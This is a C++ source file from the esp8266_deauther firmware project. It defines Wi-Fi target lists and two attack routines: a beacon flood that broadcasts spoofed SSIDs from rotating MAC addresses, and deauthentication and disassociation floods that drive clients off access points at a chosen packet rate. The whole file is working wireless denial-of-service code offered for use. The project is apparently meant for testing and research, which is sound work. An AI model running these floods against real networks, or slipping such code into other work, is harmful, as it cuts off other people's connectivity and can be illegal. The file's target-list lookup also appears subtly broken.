/*
   Copyright (c) 2020 Stefan Kremser
   This software is licensed under the MIT License. See the license file for details.
   Source: github.com/spacehuhn/esp8266_deauther
 */

#include "attack.h"

#include "debug.h"
#include "cli.h"
#include "strh.h"

namespace attack {
    typedef struct target_t {
        uint8_t   from[6];
        uint8_t   to[6];
        uint8_t   ch;
        target_t* next;
    } target_t;

    TargetList::~TargetList() {
        h = list_begin;

        while (h) {
            target_t* to_delete = h;
            h = h->next;
            free(to_delete);
        }

        list_begin = NULL;
        list_end   = NULL;
        list_size  = 0;

        h = NULL;
    }

    void TargetList::push(const uint8_t* from, const uint8_t* to, const uint8_t ch) {
        // Create new target
        target_t* new_target = (target_t*)malloc(sizeof(target_t));

        memcpy(new_target->from, from, 6);
        memcpy(new_target->to, to, 6);
        new_target->ch   = ch;
        new_target->next = NULL;

        // Check if already in list
        Target t(new_target);

        target_t* h = list_begin;

        while (h) {
            if (Target(h) == t) {
                free(new_target);
                return;
            }
            h = h->next;
        }

        // Push to list
        if (!list_begin) {
            list_begin = new_target;
            list_end   = new_target;
            h          = list_begin;
        } else {
            list_end->next = new_target;
            list_end       = new_target;
        }

        ++(list_size);
    }

    Target TargetList::get(int i) {
        h = list_begin;
        int j = 0;

        while (h && i<j) {
            h = h->next;
            ++j;
        }

        return Target(h);
    }

    void TargetList::begin() {
        h = list_begin;
    }

    Target TargetList::iterate() {
        Target t(h);

        if (h) {
            h = h->next;
        }

        return t;
    }

    bool TargetList::available() {
        return h;
    }

    int TargetList::size() {
        return list_size;
    }

    Target::Target(target_t* ptr) {
        this->ptr = ptr;
    }

    uint8_t* Target::from() const {
        if (ptr) return ptr->from;
        else return NULL;
    }

    uint8_t* Target::to() const {
        if (ptr) return ptr->to;
        else return NULL;
    }

    uint8_t Target::ch() const {
        if (ptr) return ptr->ch;
        else return 0;
    }

    bool Target::operator==(const Target& t) const {
        if (ptr == t.ptr) return true;
        if (!ptr) return false;

        return memcmp(from(), t.from(), 6) == 0 &&
               memcmp(to(), t.to(), 6) == 0 &&
               ch() == t.ch();
    }

    void beacon(StringList& ssid_list, uint8_t* from, uint8_t* to, Encryption enc, uint8_t ch, unsigned long timeout) {
        // print SSIDs
        // print enc

        debug("Sending beacons from ");
        debug(strh::mac(from));
        debug(" to ");
        debug(strh::mac(to));
        debug(" on channel ");
        debugln(ch);

        if (timeout > 0) {
            debug("Stop after ");
            debug(timeout/1000);
            debugln(" seconds");
        }

        debugln("Type 'stop' or 'exit' to stop the attack");

        uint8_t last_byte = from[5];

        unsigned long start_time  = millis();
        unsigned long output_time = millis();

        unsigned long pkts_sent       = 0;
        unsigned long pkts_per_second = 0;

        unsigned long pkt_time     = millis();
        unsigned long pkt_interval = 100;

        bool running = true;

        while (running) {
            if (millis() - pkt_time >= pkt_interval) {
                pkt_time = millis();
                ssid_list.begin();

                for (int i = 0; running && i<ssid_list.size(); ++i) {
                    from[5] = last_byte + i;

                    String ssid = ssid_list.iterate();

                    pkts_per_second += packetinjector::beacon(ch, from, to, ssid.c_str(), enc);
                    delay(1);

                    running = !(cli::read_exit() || (timeout > 0 && millis() - start_time > timeout));
                }
            }

            if (millis() - output_time >= 1000) {
                pkts_sent += pkts_per_second;

                debug(pkts_per_second);
                debug(" pkts/s, ");
                debug(pkts_sent);
                debugln(" sent ");

                output_time = millis();

                pkts_per_second = 0;
            }
        }
        debugln("Finished ");
    }

    void deauth(TargetList& targets, bool deauth, bool disassoc, unsigned long rate, unsigned long timeout, unsigned long pkts) {
        // Output
        if (deauth && disassoc) {
            debug("Deauthing and disassociating ");
        } else if (deauth) {
            debug("Deauthing ");
        } else if (disassoc) {
            debug("Disassociating ");
        }

        debug(targets.size());
        debugln(" targets:");

        // Print MACs
        targets.begin();

        while (targets.available()) {
            Target t = targets.iterate();
            debug("- From ");
            debug(strh::mac(t.from()));
            debug(" to ");
            debug(strh::mac(t.to()));
            debug(" on channel ");
            debugln(t.ch());
        }

        debug("With ");
        debug(rate);
        debugln(" packets per second");

        if (timeout > 0) {
            debug("Stop after ");
            debug(timeout/1000);
            debugln(" seconds");
        }

        if (pkts > 0) {
            debug("Stop after ");
            debug(pkts);
            debugln(" packets");
        }

        debugln("Type 'stop' or 'exit' to stop the attack");

        unsigned long start_time  = millis();
        unsigned long output_time = millis();

        unsigned long pkts_sent       = 0;
        unsigned long pkts_per_second = 0;
        unsigned long pkt_time        = 0;
        unsigned long pkt_interval    = (1000/rate) * (deauth+disassoc);

        bool running = true;

        while (running) {
            targets.begin();

            while (running && targets.available()) {
                if (millis() - pkt_time >= pkt_interval) {
                    Target t = targets.iterate();

                    if (deauth) pkts_per_second += packetinjector::deauth(t.ch(), t.from(), t.to());
                    if (disassoc) pkts_per_second += packetinjector::disassoc(t.ch(), t.from(), t.to());

                    pkt_time = millis();
                }
                if (millis() - output_time >= 1000) {
                    pkts_sent += pkts_per_second;

                    debug(pkts_per_second);
                    debug(" pkts/s, ");
                    debug(pkts_sent);
                    debugln(" sent");

                    output_time = millis();

                    pkts_per_second = 0;
                }
                running = !(cli::read_exit()
                            || (timeout > 0 && millis() - start_time > timeout)
                            || (pkts > 0 && pkts_sent > pkts));
            }
        }
    }
}